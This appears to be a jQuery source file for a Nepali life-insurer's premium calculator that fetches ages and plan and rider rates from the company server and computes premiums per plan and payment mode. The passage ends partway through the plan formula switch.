accounting.settings = {
    currency: {
        symbol: "",   // default currency symbol is '$'
        format: "%s%v", // controls output: %s = symbol, %v = value/number (can be object: see below)
        decimal: ".",  // decimal point separator
        thousand: ",",  // thousands separator
        precision: 2   // decimal places
    },
    number: {
        precision: 0,  // default precision on numbers is 0
        thousand: ",",
        decimal: "."
    }
}

var selectedPlan='';
var ageDiffMap;
var ageForDampatiAmrit;
var term=0.0;
var ageNxt=0.0;
var ageNr=0.0;
var ageLast=0.0;
var propAge=0.0;
var sumAssured=0.0;
var rateOccuExtra=0.0;
var payMode;
// var ip="202.63.241.8";
//var ip="192.168.0.17";
// var port="15313";
//var port="8090";
var ip="member.nationallife.com.np";

var port="";

$('#plan').change(function(){
    $('#premiumSpot').text('')
    $('input:checkbox').removeAttr('checked');
    
    if($(this).val() == 'BB'){ // For Pension Plan
        $('.total_perm_disable').css('display','block')
        $('.term_life_add_benefit').css('display','block')
        $('#wop').attr("disabled", true)
    }else if($(this).val()=='YSA'||$(this).val()=='YAB'){
        $('#wop').attr("disabled", true)
    }else if($(this).val()=='ASA'||$(this).val()=='ASAW'||$(this).val()=='SSA'||$(this).val()=='YSSA'){
        $('.total_perm_disable').css('display','block')
    }
    else{
        $('#wop').attr("disabled", false)
        $('.total_perm_disable').css('display','none')
        $('.term_life_add_benefit').css('display','none')
    }
        if($(this).val()=='YSSA'){
        $('.term_life_add_benefit').css('display','none')
        $('#wop').attr("disabled", true)    
         $('.total_perm_disable').css('display','false')
    }

    
    if($(this).val()=='YBA'||$(this).val()=='Y'||$(this).val()=='Y1'){ //For BalAmrit Category
        $('#rider').css('display','none')
        $('#dobProposerSpan').css('display','block')
    }else{
        $('#rider').css('display','block')
        $('#dobProposerSpan').css('display','none')
    }
    
    if($(this).val()=='YSSA'||$(this).val()=='SSA'||$(this).val()=='J'||$(this).val()=='E'||$(this).val()=='AB'||$(this).val()=='ASA'||$(this).val()=='ASAW'){
        $('.ci').css('display','block')

    }else{
        $('.ci').css('display','none')
    }
    
    selectedPlan=$(this).val()

    if(selectedPlan=='DA'){   // If Dampati Amrit Initialize AgeDiff

        $('#dadob').css('display','block')
        ageDiffMap = new Object();
        ageDiffMap[0]=0;
        ageDiffMap[1]=1
        ageDiffMap[2]=1
        ageDiffMap[3]=2
        ageDiffMap[4]=2
        ageDiffMap[5]=3
        ageDiffMap[6]=3
        ageDiffMap[7]=4
        ageDiffMap[8]=5
        ageDiffMap[9]=5
        ageDiffMap[10]=6
        ageDiffMap[11]=7
        ageDiffMap[12]=8
        ageDiffMap[13]=8
        ageDiffMap[14]=9
        ageDiffMap[15]=10
        ageDiffMap[16]=11
        ageDiffMap[17]=11
        ageDiffMap[18]=12
        ageDiffMap[19]=13
        ageDiffMap[20]=14
    }else{
        $('#dadob').css('display','none')
    }

    if($(this).val()=="YSA"||$(this).val()=="YBA"||$(this).val()=="YAB"||$(this).val()=="YSSA"){
        $('#intervalArea').css('display','none')
    }else{
        $('#intervalArea').css('display','block')
    }

});

function getAgeDiff(key) { // Function to call Dampati Amrit AgeDiff
    return ageDiffMap[key];
}

function calcDampatiAmritAge(mainAge,husbandWifeAge){// Function for Dampati Amrit : Calc Age Diff
    if($('#plan').val()=='DA'){
        var lowestAge=0;
        var ageDiff=mainAge-husbandWifeAge
        if(ageDiff<0){
            ageDiff=ageDiff*(-1)
        }
        if(ageDiff>20){
            alert("Age Diff between Husband and Wife cannot be greater than 20")
        }else{
            $("#calcPrm").show();
        }
        if(husbandWifeAge>mainAge){
            lowestAge=mainAge
        }else{
            lowestAge=husbandWifeAge
        }
        ageForDampatiAmrit=parseInt(getAgeDiff(ageDiff))+parseInt(lowestAge)  

    }
}

$('#term').change(function(){
    term= $('#term').val(); //Init Term
});
 
$('#dobType').change(function() {
    if (this.value == 'bs') {
       
    }
    else if (this.value == 'ad') {
         
    }
});

 $('#dob').change(function(){// Main Age Calculation
    $('#dob2').val('')
     var dob=$('#dob').val()

     
     var dobType=$('#dobType').val()
     var ageNxtBd=0;
     var ageNearerBd=0;
     var ageLastBd=0;

     ageNxtBd=JSON.parse($.ajax({
         url:'https://'+ip+':'+port+'/plan/getAge',
         type:'get',
         cache:false,
         crossDomain: true,
         async:false,
         data:{dob:dob,dateType:dobType}
     }).responseText)["ageNxt"];

     ageNearerBd=JSON.parse($.ajax({
         url:'https://'+ip+':'+port+'/plan/getAge',
         type:'get',
         cache:false,
         crossDomain: true,
         async:false,
         data:{dob:dob,dateType:dobType}
     }).responseText)["ageNr"];

     ageLastBd=JSON.parse($.ajax({
         url:'https://'+ip+':'+port+'/plan/getAge',
         type:'get',
         cache:false,
         crossDomain: true,
         async:false,
         data:{dob:dob,dateType:dobType}
     }).responseText)["ageLast"];
    
    if($('#plan').val()=='BA' && ageNxtBd<18){//No Riders below 18 Years for Bachat Amrit and BalAmrit All plans
        $('#rider').css('display','none')
    }else if ($("#plan").val()=="Y"||$("#plan").val()=="Y1"||$("#plan").val()=="YBA"){
          $('#rider').css('display','none')
    }else{
        $('#rider').css('display','block')
    }
    
    ageNr=ageNearerBd
    ageNxt=ageNxtBd
     ageLast=ageLastBd
     if(selectedPlan == 'SASA'){
         $("#assuredDobSpan").text(' ( Age Nearer Birthday: '+ageNr+' )')
     }
     if(selectedPlan == 'SAE'){
         $("#assuredDobSpan").text(' ( Age Nearer Birthday: '+ageNr+' )')
     }


 });
 
 $('#dobProposer').change(function(){ //Calculate Proposer Age
     
     var dob=$('#dobProposer').val()

     
     var dobType=$('#dobType').val()
     var ageNxtBd=0;
     var ageNearerBd=0;


     ageNxtBd=JSON.parse($.ajax({
         url:'https://'+ip+':'+port+'/plan/getAge',
         type:'get',
         cache:false,
         crossDomain: true,
         async:false,
         data:{dob:dob,dateType:dobType}
     }).responseText)["ageNxt"];

    propAge=ageNxtBd //Init Proposer Age
   
    
 });
 
 $('#dob2').change(function(){ //Calculate DampatiAmrit Age
     
     var dob=$('#dob2').val().split('/')
     
     var dobType=$('#dobType').val()
     var ageNxtBd=0;
     var ageNearerBd=0;

     ageNearerBd=JSON.parse($.ajax({
         url:'https://'+ip+':'+port+'/plan/getAge',
         type:'get',
         cache:false,
         crossDomain: true,
         async:false,
         data:{dob:$('#dob2').val(),dateType:dobType}
     }).responseText)["ageNr"];

    calcDampatiAmritAge(ageNr,ageNearerBd) //Init Age For Dampati Amrit
    
 });


$('#sumAssured').change(function(){
    sumAssured= $('#sumAssured').val() //Init Sum Assured

});
$('#interval').change(function(){
    payMode= $('#interval').val() //Init Pay Mode
});



$('#myform').on("submit",function (e) {
    e.preventDefault();

    if ($('#plan').val() == 0 || $('#plan').val() == null) {
        alert("Please select plan")
        return
    }

    if ($("#plan").val() == 'YSA' || $("#plan").val() == 'YAB' || $("#plan").val() == 'YBA' || $("#plan").val() == 'YSSA') {

    } else {
        if ($('#interval').val() == 0 || $('#interval').val() == null) {
            alert("Please select PayMode")
            return
        }
    }

    if ($('#sumAssured').val() < 50000.00) {
        alert("Please enter valid Sum Assured")
        return
    }


    if (selectedPlan == "BA") {

        if ($("#term").val() == 10) {
            selectedPlan = "BA10"
        } else if ($("#term").val() == 15) {
            selectedPlan = "BA15"
        } else if ($("#term").val() == 20) {
            selectedPlan = "BA20"
        } else {
            alert("Only 10 , 15 , 20 term years applicable in this plan")
            return
        }

    }


    if(selectedPlan=="SASA"){
        if($("#term").val()<5){
            alert("Minimum term is 5 years")
            return
        }
        if($("#term").val()>52){
            alert("Maximum term is 52 years")
            return
        }

        if ($('#sumAssured').val() < 10000.00) {
            alert("Minimum Sum Assured is 10000.00")
            return
        }

    }

    var planRate

    if (selectedPlan == "DA") {
        // planRate = getPlanRateFromSqlQuery(selectedPlan, term, ageForDampatiAmrit, propAge, 'A');
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageForDampatiAmrit,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }
    else if (selectedPlan == "BB") {
        // planRate = getPlanRateFromSqlQuery(selectedPlan, term, ageNr, propAge, 'A');
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageNr,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }else if(selectedPlan == "ASA"||selectedPlan == "ASAW"){
        if(sumAssured<500000){
            alert("Minimun sum assured should be Rs.500000")
            return
        }
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageLast,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }else if(selectedPlan == "SSA" || selectedPlan == "YSSA"){
        if(sumAssured<200000){
            alert("Minimun sum assured should be Rs.200000")
            return
        }
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageLast,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    } else if (selectedPlan != "BB" && selectedPlan != "DA") {

        //Default Rate

        // planRate = getPlanRateFromSqlQuery(selectedPlan, term, ageNxt, propAge, 'A');
        propAge=propAge+"";
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageNxt,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }
    if (selectedPlan == "SASA") {
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageNr,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }
    if (selectedPlan == "SAE") {
        propAge=propAge+""
        planRate=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageNr,propAge:propAge,
                rateFor:"A"}
        }).responseText;
    }
    if (planRate === undefined || planRate == 0.0) {
        alert("This plan is not applicable for the Age and Term you Selected")
        return
    }


    var planRate2;

    if (selectedPlan == "Y" || selectedPlan == "Y1" || selectedPlan == "YBA") {
        // planRate2 = getPlanRateFromSqlQuery(selectedPlan, term, ageNxt, propAge, 'P');
        propAge=propAge+""
        planRate2=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getPlanRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,term:term,
                age:ageNxt,propAge:propAge,
                rateFor:"P"}
        }).responseText;

        if (planRate2 === undefined || planRate2 == 0.0) {
            alert("This plan is not applicable for the Age and Term you Selected")
            return
        }

    }


    var rateADB = 0.0
    var rateWOP = 0.0
    var rateTDB = 0.0
    var rateATLB = 0.0
    var rateCI = 0.0

    if ($('#adb').is(':checked')) {
        // rateADB = getRiderRateFromSqlQuery(selectedPlan, 'ADB', 0, 0)
        rateADB=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getRiderRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,riderCode:"ADB",term:"0",
                age:"0"}
        }).responseText;
    }
    if ($('#wop').is(':checked')) {
        // rateWOP = getRiderRateFromSqlQuery(selectedPlan, 'WOP', 0, 0)
        rateWOP=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getRiderRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,riderCode:"WOP",term:"0",
                age:"0"}
        }).responseText;

    }
    if ($('#total_perm_disable').is(':checked')) {
        // rateTDB = getRiderRateFromSqlQuery(selectedPlan, 'TDB', 0, 0)
        rateTDB=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getRiderRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,riderCode:"TDB",term:"0",
                age:"0"}
        }).responseText;
    }
    if ($('#term_life_add_benefit').is(':checked')) {
        // rateATLB = getRiderRateFromSqlQuery(selectedPlan, 'ATLB', ageNr, term)

        rateATLB=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getRiderRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,riderCode:"ATLB",term:term,
                age:ageNr}
        }).responseText;
    }
    if ($('#ci').is(':checked')) {
        // CI needs Age Nearer and Term
        // rateCI = getRiderRateFromSqlQuery(selectedPlan, 'CI', ageNr, term)

        rateCI=$.ajax({
            url:'https://'+ip+':'+port+'/plan/getRiderRate',
            type:'get',
            cache:false,
            crossDomain: true,
            async:false,
            data:{selectedPlan:selectedPlan,riderCode:"CI",term:term,
                age:ageNr}
        }).responseText;
    }


    var calculatedPrm = calculatePremium(selectedPlan, planRate, planRate2, term, sumAssured,
        payMode, ageNxt, propAge, rateADB, rateWOP, rateTDB, rateATLB, rateCI)


    bootbox.alert({
        message: "Premium payable Rs."+accounting.formatMoney(calculatedPrm),
        size: 'small'
    });


});
// --------------------------------------------------------- Run the SQL SELECT Query For Plan Rate -----------------------------------------------------------

function getPlanRateFromSqlQuery(PlanCode,term,age,propAge,rateFor){
    var planRate;
    var sql='';
    if(selectedPlan=="BA10"||selectedPlan=="BA15"||selectedPlan=="BA20"){
        sql="select Rate from PLANRATE where PlanCode = '"+PlanCode+ "' and Age = "+age
    }else if(selectedPlan=="Y"||selectedPlan=="Y1"||selectedPlan=="YBA"){
        if(rateFor=="P"){
            sql="select Rate from PLANRATE where PlanCode = '"+PlanCode+ "' and Age = "+propAge+" and RateFor = '"+rateFor+"' and TermYear = "+term
        }else{
            sql="select Rate  from PLANRATE where PlanCode = '"+PlanCode+ "' and Age = "+age+" and RateFor = '"+rateFor+"' and TermYear = "+term
        }

    }
    else{
        sql="select Rate from PLANRATE where PlanCode = '"+PlanCode+ "' and Age = "+age+" and TermYear = "+term
    }

    planRate= alasql(sql);
    return planRate;
}

// --------------------------------------------------------- Run the SQL SELECT Query For Rider Rate -----------------------------------------------------------

function getRiderRateFromSqlQuery(planCode,riderCode,riderEntryAge,termYear){
    var riderRate;
    var sql='';
    if(riderCode=="ADB"){
        sql="select Rate from RIDERBENIFITRATE where RiderCode = '"+riderCode+"' and PlanCode = '"+planCode+"'"
    }else if(riderCode=="WOP"){
        sql="select Rate from RIDERBENIFITRATE where RiderCode = '"+riderCode+"' and PlanCode = '"+planCode+"'"
    }else if (riderCode=="ATLB"){
        sql="select Rate from RIDERBENIFITRATE where RiderCode = 'TB_BBB' and PlanCode = '"+planCode+"' and Age = "+riderEntryAge+" and TermYear="+termYear+" "
    }else if(riderCode=="TDB"){
        return riderRate=1.5;
    }else if(riderCode=="CI"){
        sql="select Rate from RIDERBENIFITRATE where RiderCode = 'CI' and PlanCode='"+planCode+"' and Age= "+riderEntryAge+" and TermYear="+termYear+" "
    }
    riderRate=alasql(sql);
    return riderRate[0]['Rate'];
}


//---------------------------------------------------------- Premium Calculation -------------------------------------------------------------------------------

function calculatePremium(plan,planRate,planRate2,term,sumAssured,payMode,primaryAge,secondaryAge,rateADB,rateWOP,rateTDB,rateATLB,rateCI){
    var premium = 0.0
    var Wop= 0.0
    var Adb = 0.0
    var Tdb = 0.0
    var Atlb  = 0.0
    var CI = 0.0
    var sumOfAgeAndTerm = parseInt(primaryAge) + parseInt(term) //For max Adb age
    var termForADB  = term //For max Adb age
    var sumAssuredForADB  = 0.0 //Universal Logic of ADB SumAssured

    if (sumAssured > 5000000.0) {
        sumAssuredForADB = 5000000.0
    }else{
        sumAssuredForADB = sumAssured
    }
        
    var sumAssuredForCI=0.0;//Universal logic of CI SumAssured
    
    if(sumAssured>5000000.0){
        sumAssuredForCI=5000000.0;
    }else{
        sumAssuredForCI=sumAssured;
    }



    switch(plan){
        case 'A':		//----- Anticipated Endowment

            var rebate=1.0;
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }

            var yearlyPremium=((planRate - rebate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000

            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if(payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if(payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }
            return yearlyPremium;
            break;

        case 'AB': //-------Amrit Barsh
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }

            if(rateCI!=0.0){
                    CI=rateCI;
            }
            var yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000
            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if(payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if(payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'ASA':// ---- Amrit Shree Anticipated

            var rebate=0.0
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            if(rateCI!=0.0){
                CI=parseFloat(rateCI)
            }
            if(rateTDB!=0.0){
                Tdb=parseFloat(rateTDB)
            }

            var sumAssuredForTdb=0.0
            sumAssuredForTdb=sumAssured;

            if(sumAssured>=1000000){
                rebate=1.0;
            }

            planRate=planRate-rebate;

            var yearlyPremium = 0.0

            if(payMode=="HFLY"){
                planRate=planRate-(planRate*(1.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/2.0
            }else if(payMode=="QTLY"){
                planRate=planRate-(planRate*(0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/4.0
            }else if(payMode=="MTLY"){
                planRate=planRate+(planRate*(1.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/12.0
            }else if(payMode=="YRLY"){
                planRate=planRate-(planRate*(2.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
            }

            return yearlyPremium;
            break;

        case 'ASAW':// ---- Amrit Shree Anticipated Whole Life


            var rebate=0.0

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            if(rateCI!=0.0){
                CI=parseFloat(rateCI)
            }
            if(rateTDB!=0.0){
                Tdb=parseFloat(rateTDB)
            }

            var sumAssuredForTdb=0.0
            sumAssuredForTdb=sumAssured;

            if(sumAssured>=1000000){
                rebate=1.0;
            }

            planRate=planRate-rebate;

            var yearlyPremium = 0.0

            if(payMode=="HFLY"){
                planRate=planRate-(planRate*(1.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/2.0
            }else if(payMode=="QTLY"){
                planRate=planRate-(planRate*(0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/4.0
            }else if(payMode=="MTLY"){
                planRate=planRate+(planRate*(1.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
                yearlyPremium=yearlyPremium/12.0
            }else if(payMode=="YRLY"){
                planRate=planRate-(planRate*(2.0/100.0));
                yearlyPremium=((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000+(Tdb * sumAssuredForTdb) / 1000.0
            }
            return yearlyPremium;
            break;


        case 'BA10'://-------------Bachat Amrit 10 years

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var rebate=0.0

            if(sumAssured>300000.0){
                rebate=2.0
            }
            if(sumAssured >= 100000.0 && sumAssured <= 300000.0){
                rebate=1.0
            }

            planRate=planRate-rebate

            if(payMode=="YRLY"){
                planRate = planRate - planRate * (2.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
            }else if(payMode=="HFLY"){
                planRate = planRate - planRate * (1.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 2
            }else if(payMode=="QTLY"){
                planRate = planRate + planRate * (5.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 4
            }
            return yearlyPremium;
            break;

        case 'BA15': //---------------------------Bachat Amrit 15 yrs
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var rebate=0.0

            if(sumAssured>300000.0){
                rebate=2.0
            }
            if(sumAssured >= 100000.0 && sumAssured <= 300000.0){
                rebate=1.0
            }

            planRate=planRate-rebate

            if(payMode=="YRLY"){
                planRate = planRate - planRate * (2.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
            }else if(payMode=="HFLY"){
                planRate = planRate - planRate * (1.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 2
            }else if(payMode=="QTLY"){
                planRate = planRate + planRate * (5.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 4
            }
            return yearlyPremium;
            break;

        case 'BA20':

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var rebate=0.0

            if(sumAssured>300000.0){
                rebate=2.0
            }
            if(sumAssured >= 100000.0 && sumAssured <= 300000.0){
                rebate=1.0
            }

            planRate=planRate-rebate

            if(payMode=="YRLY"){
                planRate = planRate - planRate * (2.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
            }else if(payMode=="HFLY"){
                planRate = planRate - planRate * (1.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 2
            }else if(payMode=="QTLY"){
                planRate = planRate + planRate * (5.0 / 100.0)
                yearlyPremium = ((planRate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000
                yearlyPremium = yearlyPremium / 4
            }
            return yearlyPremium;
            break;

        case 'BB':
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            
            if(rateTDB!=0.0){
                Tdb=parseFloat(rateTDB)
            }
            
            if(rateATLB!=0.0){
                Atlb=parseFloat(rateATLB)
            }
            
            var sumAssuredForTdb=0.0
            sumAssuredForTdb=sumAssured;
            var sumAssuredForAtlb=0.0

            if(sumAssured > 1000000.0){
                sumAssuredForAtlb = 1000000.0
            }else{
                sumAssuredForAtlb = sumAssured
            }
            var yearlyPremium = (((planRate)) * sumAssured) / 10000.0 + (Adb * sumAssuredForADB) / 1000.0 + (Wop * sumAssured) / 1000.0 + (Tdb * sumAssuredForTdb) / 1000.0 + (Atlb * sumAssuredForAtlb) / 1000.0


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }
            return yearlyPremium;
            break;

        case 'C': //-----------------------Child Endowment and Marriage
            var rebate=1.0
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var yearlyPremium = ((planRate - rebate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;

        case 'DA'://-----------------------DampatiAmrit
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var rebate=0.0
            if(sumAssured > 200000.0){
                rebate=1.0
            }

            var yearlyPremium = ((planRate - rebate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;


        case 'E'://-----------------------Endowment
            rebate=1.0

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            
            if(rateCI!=0.0){
                    CI=rateCI;
            }
            var yearlyPremium = ((planRate - rebate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000

            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;


        case 'F'://----------------------------------- Bal Bhagyodaya

            rebate=0.0

            if(sumAssured >= 25000.0){
                rebate=1.0
            }
            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            var yearlyPremium = ((planRate - rebate) * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000


            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
                yearlyPremium = (yearlyPremium + 4.0 / 100.0 * yearlyPremium) / 4.0
            }else if
            (payMode=="MTLY"){
                yearlyPremium = (yearlyPremium + 6.0 / 100.0 * yearlyPremium) / 12.0
            }

            return yearlyPremium;
            break;


        case 'J'://------------------------------Jeevan Amrit

            if(rateADB!=0.0){
                Adb=parseFloat(rateADB)
            }
            if(rateWOP!=0.0){
                Wop=parseFloat(rateWOP)
            }
            
            if(rateCI!=0.0){
                    CI=rateCI;
            }
            var  yearlyPremium = (planRate * sumAssured) / 1000 + (Adb * sumAssuredForADB) / 1000 + (Wop * sumAssured) / 1000 + (CI*sumAssuredForCI)/1000

            if(payMode=="HFLY"){
                yearlyPremium = (yearlyPremium + 3.0 / 100.0 * yearlyPremium) / 2.0
            }else if
            (payMode=="QTLY"){
